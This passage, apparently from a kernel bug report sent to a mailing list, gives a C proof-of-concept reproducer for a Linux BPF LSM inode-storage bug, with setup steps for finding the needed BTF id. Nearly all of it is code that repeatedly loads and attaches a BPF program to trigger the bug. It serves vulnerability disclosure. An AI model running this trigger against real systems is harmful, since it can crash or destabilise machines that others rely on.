0251111(commit 2666975a8905776d306bee01c5d98a0395bda1c9).
>
> To successfully run the PoC, you need to obtain the BTF ID for `bpf_lsm_f=
ile_alloc_security` and set the variable `btf_id` in function `load_prog` t=
o this value. You can retrieve this BTF ID using the following command: `bp=
ftool btf dump file path-to-your-vmlinux | grep bpf_lsm_file_alloc_security=
`.
>
> ```c
> #define _GNU_SOURCE
>
> #include <dirent.h>
> #include <endian.h>
> #include <errno.h>
> #include <fcntl.h>
> #include <signal.h>
> #include <stdarg.h>
> #include <stdbool.h>
> #include <stdint.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/prctl.h>
> #include <sys/stat.h>
> #include <sys/syscall.h>
> #include <sys/types.h>
> #include <sys/wait.h>
> #include <time.h>
> #include <unistd.h>
> #include <linux/bpf.h>
>
> #ifndef __NR_bpf
> #define __NR_bpf 321
> #endif
>
> #define BPF_FUNC_inode_storage_get 145
> #define BPF_FUNC_inode_storage_delete 146
>
> #define BPF_EXIT_INSN()                                         \
>         ((struct bpf_insn) {                                    \
>                 .code  =3D BPF_JMP | BPF_EXIT,                    \
>                 .dst_reg =3D 0,                                   \
>                 .src_reg =3D 0,                                   \
>                 .off   =3D 0,                                     \
>                 .imm   =3D 0 })
>
> #define BPF_MOV64_IMM(DST, IMM)                                 \
>         ((struct bpf_insn) {                                    \
>                 .code  =3D BPF_ALU64 | BPF_MOV | BPF_K,           \
>                 .dst_reg =3D DST,                                 \
>                 .src_reg =3D 0,                                   \
>                 .off   =3D 0,                                     \
>                 .imm   =3D IMM })
>
> #define BPF_LDX_MEM(SIZE, DST, SRC, OFF)                        \
>         ((struct bpf_insn) {                                    \
>                 .code  =3D BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,    \
>                 .dst_reg =3D DST,                                 \
>                 .src_reg =3D SRC,                                 \
>                 .off   =3D OFF,                                   \
>                 .imm   =3D 0 })
>
> #define BPF_LD_IMM64_RAW_FULL(DST, SRC, OFF1, OFF2, IMM1, IMM2) \
>         ((struct bpf_insn) {                                    \
>                 .code  =3D BPF_LD | BPF_DW | BPF_IMM,             \
>                 .dst_reg =3D DST,                                 \
>                 .src_reg =3D SRC,                                 \
>                 .off   =3D OFF1,                                  \
>                 .imm   =3D IMM1 }),                               \
>         ((struct bpf_insn) {                                    \
>                 .code  =3D 0, /* zero is reserved opcode */       \
>                 .dst_reg =3D 0,                                   \
>                 .src_reg =3D 0,                                   \
>                 .off   =3D OFF2,                                  \
>                 .imm   =3D IMM2 })
>
> /* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */
>
> #define BPF_LD_MAP_FD(DST, MAP_FD)                              \
>         BPF_LD_IMM64_RAW_FULL(DST, BPF_PSEUDO_MAP_FD, 0, 0,     \
>                               MAP_FD, 0)
>
> #define BPF_MOV64_REG(DST, SRC)                                 \
>         ((struct bpf_insn) {                                    \
>                 .code  =3D BPF_ALU64 | BPF_MOV | BPF_X,           \
>                 .dst_reg =3D DST,                                 \
>                 .src_reg =3D SRC,                                 \
>                 .off   =3D 0,                                     \
>                 .imm   =3D 0 })
>
> #define BPF_EMIT_CALL(FUNC)                                     \
>         ((struct bpf_insn) {                                    \
>                 .code  =3D BPF_JMP | BPF_CALL,                    \
>                 .dst_reg =3D 0,                                   \
>                 .src_reg =3D 0,                                   \
>                 .off   =3D 0,                                     \
>                 .imm   =3D ((FUNC) - BPF_FUNC_unspec) })
>
>
> static unsigned long long procid;
> static inline uint64_t ptr_to_u64(const void *ptr) {
>     return (uint64_t)(unsigned long)ptr;
> }
>
> static void sleep_ms(uint64_t ms)
> {
>         usleep(ms * 1000);
> }
>
> static uint64_t current_time_ms(void)
> {
>         struct timespec ts;
>         if (clock_gettime(CLOCK_MONOTONIC, &ts))
>         exit(1);
>         return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 100000=
0;
> }
>
> #define BITMASK(bf_off,bf_len) (((1ull << (bf_len)) - 1) << (bf_off))
> #define STORE_BY_BITMASK(type,htobe,addr,val,bf_off,bf_len) *(type*)(addr=
) =3D htobe((htobe(*(type*)(addr)) & ~BITMASK((bf_off), (bf_len))) | (((typ=
e)(val) << (bf_off)) & BITMASK((bf_off), (bf_len))))
>
> static bool write_file(const char* file, const char* what, ...)
> {
>         char buf[1024];
>         va_list args;
>         va_start(args, what);
>         vsnprintf(buf, sizeof(buf), what, args);
>         va_end(args);
>         buf[sizeof(buf) - 1] =3D 0;
>         int len =3D strlen(buf);
>         int fd =3D open(file, O_WRONLY | O_CLOEXEC);
>         if (fd =3D=3D -1)
>                 return false;
>         if (write(fd, buf, len) !=3D len) {
>                 int err =3D errno;
>                 close(fd);
>                 errno =3D err;
>                 return false;
>         }
>         close(fd);
>         return true;
> }
>
> static void kill_and_wait(int pid, int* status)
> {
>         kill(-pid, SIGKILL);
>         kill(pid, SIGKILL);
>         for (int i =3D 0; i < 100; i++) {
>                 if (waitpid(-1, status, WNOHANG | __WALL) =3D=3D pid)
>                         return;
>                 usleep(1000);
>         }
>         DIR* dir =3D opendir("/sys/fs/fuse/connections");
>         if (dir) {
>                 for (;;) {
>                         struct dirent* ent =3D readdir(dir);
>                         if (!ent)
>                                 break;
>                         if (strcmp(ent->d_name, ".") =3D=3D 0 || strcmp(e=
nt->d_name, "..") =3D=3D 0)
>                                 continue;
>                         char abort[300];
>                         snprintf(abort, sizeof(abort), "/sys/fs/fuse/conn=
ections/%s/abort", ent->d_name);
>                         int fd =3D open(abort, O_WRONLY);
>                         if (fd =3D=3D -1) {
>                                 continue;
>                         }
>                         if (write(fd, abort, 1) < 0) {
>                         }
>                         close(fd);
>                 }
>                 closedir(dir);
>         } else {
>         }
>         while (waitpid(-1, status, __WALL) !=3D pid) {
>         }
> }
>
> static void setup_test()
> {
>         prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
>         setpgrp();
>         write_file("/proc/self/oom_score_adj", "1000");
> }
>
> static void execute_one(void);
>
> #define WAIT_FLAGS __WALL
>
> static void loop(void)
> {
>         int iter =3D 0;
>         for (;; iter++) {
>                 int pid =3D fork();
>                 if (pid < 0)
>         exit(1);
>                 if (pid =3D=3D 0) {
>                         setup_test();
>                         execute_one();
>                         exit(0);
>                 }
>                 int status =3D 0;
>                 uint64_t start =3D current_time_ms();
>                 for (;;) {
>                         sleep_ms(10);
>                         if (waitpid(-1, &status, WNOHANG | WAIT_FLAGS) =
=3D=3D pid)
>                                 break;
>                         if (current_time_ms() - start < 5000)
>                                 continue;
>                         kill_and_wait(pid, &status);
>                         break;
>                 }
>         }
> }
>
> int create_btf_fd(){
>     *(uint64_t*)0x200000000100 =3D 0x200000000000;
>     *(uint16_t*)0x200000000000 =3D 0xeb9f;
>     *(uint8_t*)0x200000000002 =3D 1;
>     *(uint8_t*)0x200000000003 =3D 0;
>     *(uint32_t*)0x200000000004 =3D 0x18;
>     *(uint32_t*)0x200000000008 =3D 0;
>     *(uint32_t*)0x20000000000c =3D 0x1c;
>     *(uint32_t*)0x200000000010 =3D 0x1c;
>     *(uint32_t*)0x200000000014 =3D 2;
>     *(uint32_t*)0x200000000018 =3D 0;
>     *(uint16_t*)0x20000000001c =3D 0;
>     *(uint8_t*)0x20000000001e =3D 0;
>     *(uint8_t*)0x20000000001f =3D 1;
>     *(uint32_t*)0x200000000020 =3D 4;
>     *(uint8_t*)0x200000000024 =3D 0x20;
>     *(uint8_t*)0x200000000025 =3D 0;
>     *(uint8_t*)0x200000000026 =3D 0;
>     *(uint8_t*)0x200000000027 =3D 1;
>     *(uint32_t*)0x200000000028 =3D 1;
>     *(uint16_t*)0x20000000002c =3D 0;
>     *(uint8_t*)0x20000000002e =3D 0;
>     *(uint8_t*)0x20000000002f =3D 0x10;
>     *(uint32_t*)0x200000000030 =3D 8;
>     *(uint8_t*)0x200000000034 =3D 0;
>     *(uint8_t*)0x200000000035 =3D 0;
>     *(uint64_t*)0x200000000108 =3D 0;
>     *(uint32_t*)0x200000000110 =3D 0x36;
>     *(uint32_t*)0x200000000114 =3D 0;
>     *(uint32_t*)0x200000000118 =3D 1;
>     *(uint32_t*)0x20000000011c =3D 0;
>     *(uint32_t*)0x200000000120 =3D 0;
>     *(uint32_t*)0x200000000124 =3D 0;
>     int res =3D syscall(__NR_bpf, /*cmd=3D*/0x12ul, /*arg=3D*/0x200000000=
100ul, /*size=3D*/0x28ul);
>     return res;
> }
>
> int bpf_map_create(uint32_t map_type, uint32_t key_size, uint32_t value_s=
ize, unsigned int max_entries, unsigned int flags, unsigned int btf_id) {
>         union bpf_attr attr =3D {.map_type =3D map_type,
>         .key_size =3D key_size,
>         .value_size =3D value_size,
>         .max_entries =3D max_entries,
>         .map_flags =3D flags,
>         .map_extra =3D 0,
>         .btf_fd=3Dbtf_id,
>         .btf_key_type_id=3D1,
>         .btf_value_type_id=3D1,
>     };
>         return syscall(__NR_bpf, 0, &attr, 0x40);
> }
>
> static int load_prog(struct bpf_insn *insns, size_t cnt) {
>     int btf_id =3D 0; // change to valid btf of bpf_lsm_file_alloc_securi=
ty
>     if(btf_id =3D=3D 0) {
>         printf("Btf id is not available! \n");
>         exit(0);
>     }
>     union bpf_attr attr =3D {
>         .prog_type =3D 0x1d,
>         .insns =3D ptr_to_u64(insns),
>         .insn_cnt =3D cnt,
>         .license =3D ptr_to_u64("GPL"),
>         .attach_btf_id =3D btf_id,
>         .expected_attach_type =3D BPF_LSM_MAC,
>     };
>     int prog_fd=3Dsyscall(__NR_bpf, 5, &attr, sizeof(attr));
>     return prog_fd;
> }
>
> int link_create(int prog_fd, int target_fd, uint32_t attach_type)
> {
>         union bpf_attr attr =3D {
>                 .link_create.prog_fd =3D prog_fd,
>                 .link_create.target_fd =3D target_fd,
>                 .link_create.attach_type =3D attach_type,
>         };
>
>         return syscall(__NR_bpf, BPF_LINK_CREATE, &attr, sizeof(attr.link=
_create));
> }
>
> uint64_t r[4] =3D {0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffff=
ffff, 0xffffffffffffffff};
>
> void execute_one(void)
> {
>         intptr_t res =3D 0;
>         if (write(1, "executing program\n", sizeof("executing program\n")=
 - 1)) {}
>
>         res =3D create_btf_fd();
>         if (res !=3D -1)
>                 r[0] =3D res;
>
>         res =3D bpf_map_create(0x1c, 4, 4, 0, 0x201, r[0]);
>         if (res !=3D -1)
>                 r[1] =3D res;
>         struct bpf_insn prog[] =3D {
>             BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_1, 0),
>             BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_1, 96),
>             BPF_LD_MAP_FD(BPF_REG_1, r[1]),
>             BPF_MOV64_REG(BPF_REG_2, BPF_REG_6),
>             BPF_MOV64_IMM(BPF_REG_3, 0x0),
>             BPF_MOV64_IMM(BPF_REG_4, 0x1),
>             BPF_EMIT_CALL(BPF_FUNC_inode_storage_get),
>             BPF_MOV64_IMM(BPF_REG_0, 0x0),
>             BPF_EXIT_INSN()
>         };
>         res =3D load_prog(prog, sizeof(prog) / sizeof(prog[0]));
>         printf("loaded prog %ld\n", res);
>         if (res !=3D -1)
>             r[3] =3D res;
>         link_create(r[3], 0, BPF_LSM_MAC);
>
> }
> int main(void)
> {
>         syscall(__NR_mmap, /*addr=3D*/0x1ffffffff000ul, /*len=3D*/0x1000u=
l, /*prot=3D*/0ul, /*flags=3DMAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE*/0x32ul, /=
*fd=3D*/(intptr_t)-1, /*offset=3D*/0ul);
>         syscall(__NR_mmap, /*addr=3D*/0x200000000000ul, /*len=3D*/0x10000=
00ul, /*prot=3DPROT_WRITE|PROT_READ|PROT_EXEC*/7ul, /*flags=3DMAP_FIXED|MAP=
_ANONYMOUS|MAP_PRIVATE*/0x32ul, /*fd=3D*/(intptr_t)-1, /*offset=3D*/0ul);
>         syscall(__NR_mmap, /*addr=3D*/0x200001000000ul, /*len=3D*/0x1000u=
l, /*prot=3D*/0ul, /*flags=3DMAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE*/0x32ul, /=
*fd=3D*/(intptr_t)-1, /*offset=3D*/0ul);
>         const char* reason;
>         (void)reason;
>         for (procid =3D 0; procid < 8; procid++) {
>                 if (fork() =3D=3D 0) {
>                         loop();
>                 }
>         }
>         sleep(1000000);
>         return 0;
> }
>
> ```
>
> ## Kernel Configuration Requirements for Reproduction
>
> The vulnerability can be triggered with the kernel config in the attachme=
nt.

